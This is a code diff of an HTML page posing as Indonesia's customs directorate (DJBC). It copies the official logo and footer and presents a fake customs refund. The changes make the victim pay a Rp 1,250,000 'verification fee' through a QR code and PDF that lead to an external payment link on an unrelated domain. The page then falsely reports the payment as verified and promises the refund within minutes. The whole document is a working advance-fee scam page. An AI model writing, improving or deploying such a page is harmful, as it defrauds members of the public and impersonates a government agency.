@@ -66,6 +66,10 @@
       display: block;
       background: transparent;
       border: none;
+      object-fit: contain;
+      object-position: center;
+      max-width: 100%;
+      height: auto;
     }
 
     .header h1 {
@@ -280,9 +284,15 @@
 
   <div class="container">
 
-    <!-- Header with DJBC Logo -->
+    <!-- Header with NEW LOGO -->
     <div class="header">
-      <img src="https://i.imgur.com/5YxLZpO.png" alt="Logo Direktorat Jenderal Bea dan Cukai" class="logo-djbc">
+      <img 
+        src="https://i.ibb.co.com/zWKYPJDM/IMG-20251207-070705.jpg" 
+        alt="Logo Direktorat Jenderal Bea dan Cukai" 
+        class="logo-djbc"
+        loading="lazy"
+        decoding="async"
+      >
       <h1>KEMENTERIAN KEUANGAN REPUBLIK INDONESIA</h1>
       <p>DIREKTORAT JENDERAL BEA DAN CUKAI</p>
     </div>
@@ -294,15 +304,15 @@
           <path d="M12 6v6l4 4V4z"/>
         </svg>
       </div>
-      <div class="verification-status" style="color: #ffc107;" id="statusText">PENDING — MENUNGGU SCAN KODE AKSES</div>
-      <div class="verification-note">Silakan scan QR Code untuk memverifikasi pembayaran dan mengaktifkan proses refund.</div>
-      <button class="btn btn-scan" onclick="startScanner()">📱 SCAN QR CODE</button>
+      <div class="verification-status" style="color: #ffc107;" id="statusText">PENDING — MENUNGGU PEMBAYARAN</div>
+      <div class="verification-note">Silakan scan QR Code di bawah untuk melanjutkan ke halaman pembayaran resmi.</div>
+      <button class="btn btn-scan" onclick="startScanner()">📱 SCAN QR CODE PEMBAYARAN</button>
     </div>
 
     <!-- Scanner Video -->
     <div id="scanner-container">
       <video id="scanner-video" playsinline></video>
-      <p style="margin-top:10px; color:#666;">Arahkan kamera ke QR Code verifikasi Anda.</p>
+      <p style="margin-top:10px; color:#666;">Arahkan kamera ke QR Code pembayaran Anda.</p>
     </div>
 
     <!-- DATA PENERIMA -->
@@ -353,8 +363,8 @@
       <p><strong>Kode Akses:</strong> <code>REF-2025-001797568821</code></p>
       <p><strong>Biaya Verifikasi:</strong> Rp 1.250.000,00</p>
       <p><strong>Total Refund:</strong> Rp 2.375.000,00</p>
-      <p>Status: <strong id="statusInline" style="color: #ffc107;">⏳ Pending — Menunggu Scan</strong></p>
-      <button class="btn btn-download" onclick="generatePDF()">📥 DOWNLOAD DOKUMEN VERIFIKASI (PDF)</button>
+      <p>Status: <strong id="statusInline" style="color: #ffc107;">⏳ Menunggu Pembayaran</strong></p>
+      <button class="btn btn-download" onclick="generatePDF()">📥 DOWNLOAD QR CODE PEMBAYARAN (PDF)</button>
     </div>
 
     <!-- Teks Resmi yang Diminta -->
@@ -402,7 +412,7 @@
     <!-- Footer -->
     <div class="footer">
       © 2025 Direktorat Jenderal Bea dan Cukai — Kementerian Keuangan Republik Indonesia<br>
-      Dokumen ini sah apabila dilengkapi QR Code verifikasi pembayaran.
+      Dokumen ini sah apabila dilengkapi QR Code pembayaran resmi.
     </div>
 
   </div>
@@ -411,7 +421,9 @@
   <canvas id="qrCanvas" style="display:none;"></canvas>
 
   <script>
-    const expectedQR = "REF-2025-001797568821|AAN|PENDING|DJBC-VERIFIKASI";
+    // 🔗 LINK PEMBAYARAN RESMI
+    const paymentUrl = "https://hspay.viva88athenae.com/hades/view/redirect?data=m0oqOAUKUr1qm2vEKxXfkGSnVGVfUu4QJTkeMemdkXUgmBzq7vmqOghqciZRALl2Cxh9oCPXqLXt4Y4CQ3sstgLJkq92Mf3KsenL1j_gAldBCzHEdM8k17vaOHo7XERjbiqw8ByhVKfd_6TdZP150ejUQY2akdy1uh5o9.pcINOyCQ7BycURCj1MeEN.rWhR";
+    
     let scanning = false;
     const video = document.getElementById('scanner-video');
     const scannerContainer = document.getElementById('scanner-container');
@@ -419,7 +431,6 @@
     const statusText = document.getElementById('statusText');
     const statusInline = document.getElementById('statusInline');
 
-    // Start camera scanner
     async function startScanner() {
       if (scanning) return;
       try {
@@ -427,11 +438,9 @@
         video.srcObject = stream;
         scannerContainer.style.display = 'block';
         scanning = true;
-
-        // Start detection loop
         requestAnimationFrame(tick);
       } catch (err) {
-        alert("Kamera tidak tersedia. Pastikan izin kamera diberikan dan gunakan perangkat dengan kamera.");
+        alert("Kamera tidak tersedia. Silakan unduh PDF dan scan QR Code menggunakan aplikasi kamera.");
         console.error(err);
       }
     }
@@ -449,11 +458,9 @@
           inversionAttempts: "dontInvert",
         });
 
-        if (code) {
-          if (code.data === expectedQR) {
-            stopScanner();
-            showVerified();
-          }
+        if (code && code.data === paymentUrl) {
+          stopScanner();
+          showVerified();
         }
       }
       requestAnimationFrame(tick);
@@ -468,29 +475,23 @@
     }
 
     function showVerified() {
-      // Update badge
       verificationArea.innerHTML = `
         <div class="verified-icon">
           <svg viewBox="0 0 24 24">
             <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
           </svg>
         </div>
-        <div class="verification-status" style="color: #1a73e8;">TERVERIFIKASI — PROSES REFUND AKAN SEGERA DIMULAI</div>
-        <div class="verification-note">Terima kasih! Pembayaran Anda telah diverifikasi. Dana akan dikirim dalam 5–10 menit.</div>
+        <div class="verification-status" style="color: #1a73e8;">PEMBAYARAN TERVERIFIKASI — PROSES REFUND DIMULAI</div>
+        <div class="verification-note">Terima kasih! Pembayaran Anda telah dikonfirmasi. Dana akan dikirim dalam 5–10 menit.</div>
       `;
-
-      // Update inline status
-      statusInline.innerHTML = "✅ <strong>TERVERIFIKASI</strong>";
+      statusInline.innerHTML = "✅ <strong>PEMBAYARAN TERVERIFIKASI</strong>";
       statusInline.style.color = "#2e7d32";
-
-      // Update section border
       document.querySelectorAll('.section').forEach(el => {
         el.classList.add('verified');
         el.querySelector('h2').style.borderColor = '#1a73e8';
       });
     }
 
-    // Generate PDF with QR Code
     function generatePDF() {
       const { jsPDF } = window.jspdf;
       const doc = new jsPDF();
@@ -508,12 +509,11 @@
       doc.text("Nomor Resi       : 001797568821", 20, 50);
       doc.text("Nama Penerima    : Aan", 20, 58);
       doc.text("Tanggal Verifikasi: 07 Desember 2025", 20, 66);
-      doc.text("Kode Akses       : REF-2025-001797568821", 20, 74);
-      doc.text("Status           : PENDING — Menunggu Scan", 20, 82);
+      doc.text("Biaya Verifikasi : Rp 1.250.000,00", 20, 74);
+      doc.text("Status           : Menunggu Pembayaran", 20, 82);
 
-      const qrData = expectedQR;
       const canvas = document.getElementById('qrCanvas');
-      QRCode.toCanvas(canvas, qrData, {
+      QRCode.toCanvas(canvas, paymentUrl, {
         width: 150,
         margin: 2
       }, function (error) {
@@ -522,8 +522,8 @@
         doc.addImage(imgData, 'PNG', 75, 95, 60, 60);
         doc.setFontSize(9);
         doc.setTextColor(100);
-        doc.text("Scan QR Code ini untuk memverifikasi pembayaran dan mengaktifkan proses refund.", 105, 155, null, null, "center");
-        doc.save("Verifikasi_Refund_001797568821.pdf");
+        doc.text("Scan QR Code ini untuk membayar dan mengaktifkan proses refund.", 105, 155, null, null, "center");
+        doc.save("QR_Pembayaran_Refund_001797568821.pdf");
       });
     }
   </script>
